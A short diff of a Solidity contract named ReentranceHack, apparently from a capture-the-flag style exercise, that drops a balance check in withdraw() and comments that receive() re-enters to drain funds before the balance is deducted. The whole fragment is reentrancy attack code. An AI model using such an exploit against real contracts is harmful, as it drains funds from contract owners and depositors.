@@ -16,11 +16,11 @@ contract ReentranceHack {
 
     function withdraw() public {
         uint256 balance = cont.balanceOf(address(this));
-        if (balance > 0)
-            cont.withdraw(balance);
+        cont.withdraw(balance);
     }
 
     receive() external payable {
+        // balance not deducted yet, loop and take more
         this.withdraw();
     }
 }
